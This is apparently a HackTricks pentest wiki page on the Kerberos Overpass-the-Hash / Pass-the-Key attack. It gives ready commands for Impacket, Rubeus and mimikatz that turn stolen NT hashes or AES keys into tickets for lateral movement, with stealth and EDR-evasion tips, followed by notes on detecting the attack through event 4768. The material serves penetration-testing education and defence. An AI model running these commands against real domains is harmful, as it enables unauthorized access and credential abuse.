# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

The **Overpass The Hash/Pass The Key (PTK)** attack is designed for environments where the traditional NTLM protocol is restricted, and Kerberos authentication takes precedence. This attack leverages the NTLM hash or AES keys of a user to solicit Kerberos tickets, enabling unauthorized access to resources within a network.

Strictly speaking:

- **Over-Pass-the-Hash** usually means turning the **NT hash** into a Kerberos TGT via the **RC4-HMAC** Kerberos key.
- **Pass-the-Key** is the more generic version where you already have a Kerberos key such as **AES128/AES256** and request a TGT directly with it.

This difference matters in hardened environments: if **RC4 is disabled** or no longer assumed by the KDC, the **NT hash alone is not enough** and you need an **AES key** (or the cleartext password to derive it).

To execute this attack, the initial step involves acquiring the NTLM hash or password of the targeted user's account. Upon securing this information, a Ticket Granting Ticket (TGT) for the account can be obtained, allowing the attacker to access services or machines to which the user has permissions.

The process can be initiated with the following commands:

```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```

For scenarios necessitating AES256, the `-aesKey [AES key]` option can be utilized:

```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```

`getTGT.py` also supports requesting a **service ticket directly through an AS-REQ** with `-service <SPN>`, which can be useful when you want a ticket for a specific SPN without an extra TGS-REQ:

```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```

Moreover, the acquired ticket might be employed with various tools, including `smbexec.py` or `wmiexec.py`, broadening the scope of the attack.

Encountered issues such as _PyAsn1Error_ or _KDC cannot find the name_ are typically resolved by updating the Impacket library or using the hostname instead of the IP address, ensuring compatibility with the Kerberos KDC.

An alternative command sequence using Rubeus.exe demonstrates another facet of this technique:

```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```

This method mirrors the **Pass the Key** approach, with a focus on commandeering and utilizing the ticket directly for authentication purposes. In practice:

- `Rubeus asktgt` sends the **raw Kerberos AS-REQ/AS-REP** itself and does **not** need admin rights unless you want to target another logon session with `/luid` or create a separate one with `/createnetonly`.
- `mimikatz sekurlsa::pth` patches credential material into a logon session and therefore **touches LSASS**, which usually requires local admin or `SYSTEM` and is noisier from an EDR perspective.

Examples with Mimikatz:

```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```

To conform to operational security and use AES256, the following command can be applied:

```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```

`/opsec` is relevant because Rubeus-generated traffic differs slightly from native Windows Kerberos. Also note that `/opsec` is intended for **AES256** traffic; using it with RC4 usually requires `/force`, which defeats much of the point because **RC4 in modern domains is itself a strong signal**.

## Detection notes

Every TGT request generates **event `4768`** on the DC. In current Windows builds this event contains more useful fields than older writeups mention:

- `TicketEncryptionType` tells you which enctype was used for the issued TGT. Typical values are `0x17` for **RC4-HMAC**, `0x11` for **AES128**, and `0x12` for **AES256**.
- Updated events also expose `SessionKeyEncryptionType`, `PreAuthEncryptionType`, and the client's advertised enctypes, which helps distinguish **real RC4 dependence** from confusing legacy defaults.
- Seeing `0x17` in a modern environment is a good clue that the account, host, or KDC fallback path still permits RC4 and is therefore more friendly to NT-hash-based Over-Pass-the-Hash.

Microsoft has been progressively reducing RC4-by-default behavior since the November 2022 Kerberos hardening updates, and the current published guidance is to **remove RC4 as the default assumed enctype for AD DCs by the end of Q2 2026**. From an offensive perspective, that means **Pass-the-Key with AES** is increasingly the reliable path, while classic **NT-hash-only OpTH** will keep failing more often in hardened estates.

For more details on Kerberos encryption types and related ticketing behaviour, check:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Stealthier version

> [!WARNING]
> Each logon session can only have one active TGT at a time so be careful.

1. Create a new logon session with **`make_token`** from Cobalt Strike.
2. Then, use Rubeus to generate a TGT for the new logon session without affecting the existing one.

You can achieve a similar isolation from Rubeus itself with a sacrificial **logon type 9** session:

```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

This avoids overwriting the current session TGT and is usually safer than importing the ticket into your existing logon session.


## References

- [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}

